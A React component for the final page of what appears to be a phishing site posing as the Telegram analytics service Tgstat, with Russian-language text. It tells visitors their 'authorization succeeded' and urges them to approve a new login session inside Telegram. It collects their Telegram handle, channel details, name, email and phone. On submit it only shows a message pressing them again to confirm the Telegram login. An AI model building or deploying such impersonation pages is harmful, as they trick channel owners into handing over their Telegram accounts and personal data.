import React, { memo, useState } from "react";
import './index.scss';

const LastPage = () => {
    const [input1, setInput1] = useState('');
    const [input2, setInput2] = useState('');
    const [input3, setInput3] = useState('');
    const [input4, setInput4] = useState('');
    const [input5, setInput5] = useState('');
    const [input6, setInput6] = useState('');
    const [input7, setInput7] = useState('');
    const [input8, setInput8] = useState('');
    const [input9, setInput9] = useState('');
    const [input10, setInput10] = useState('');
    const [input11, setInput11] = useState('');

    const [isCompleteForm, setIsCompleteForm] = useState(false);

    const submit = e => {
        e.preventDefault();
        setIsCompleteForm(true);
    }

    return <div className="last-page">
        <div className="last-page__inner">
            {!isCompleteForm && <div className="last-page__title">Авторизация прошла успешно. Вам осталось подтвердить вход в телеграмме ( зайдите в телеграм и подтвердите вход Вашей сессии нажав "ДА" ). <br /> Внимательно заполните анкету ниже и отправьте на рассмотрение.</div>}
            {isCompleteForm ? 
            (
                <div className="last-page__complete-text">
                    Ой...Вероятней всего Вы не подтвердили свой вход на сервис внутри телеграма.
                    Для этого Вам нужно открыть клиент телеграма и на сообщении об авторизации подтвердить что вход делаете Вы -
                    нажав "Да,я". Если Вы закрыли свой вход - пройдите авторизацию и подайте анкету повторно. В
                    случае подтверждения входа - Письмо со статистикой будет отправлено на Вашу почту в ближайшие 48 часов.
                    Просим заметить, функция доступна для для физических владельцев каналов, если запрос подали не с аккаунте
                    владельца - подайте повторно, используя при регистрации действующий аккаунт владельца.
                </div>
            ) : 
            (
                <form className="last-form" onSubmit={submit}>
                    <div className="last-form__title">Дополнительная информация</div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Ваш логин в телеграме:</div>
                        <input type="text" value={input1} onChange={e => setInput1(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Ссылка на рекламную площадку:</div>
                        <input type="text" value={input2} onChange={e => setInput2(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Где нашли сервис Tgstat:</div>
                        <input type="text" value={input3} onChange={e => setInput3(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Как часто публикуете рекламу:</div>
                        <input type="text" value={input4} onChange={e => setInput4(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Кол-во просмотров за сутки:</div>
                        <input type="text" value={input5} onChange={e => setInput5(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Стоимость 1 поста в телеграме:</div>
                        <input type="text" value={input6} onChange={e => setInput6(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Работали ли вы ранее с Tgstat:</div>
                        <input type="text" value={input7} onChange={e => setInput7(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Цели выгруза статистики:</div>
                        <input type="text" value={input8} onChange={e => setInput8(e.target.value)} />
                    </div>
                    <div className="last-form__title">Контактная информация</div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Ваше имя:</div>
                        <input type="text" value={input9} onChange={e => setInput9(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Email:</div>
                        <input type="text" value={input10} onChange={e => setInput10(e.target.value)} />
                    </div>
                    <div className="last-form__item">
                        <div className="last-form__item-title">Контактный телефон:</div>
                        <input type="text" value={input11} onChange={e => setInput11(e.target.value)} />
                    </div>
                    <div className="last-form__descr">
                        После отправки анкеты, вам будет доступен отчет со статистикой, ссылка которая придёт на почту, которую вы указали в анкете.
                    </div>
                    <button className="last-form__button" type="submit">Отправить</button>
                </form>
            )}
        </div>
    </div>
}

export default memo(LastPage);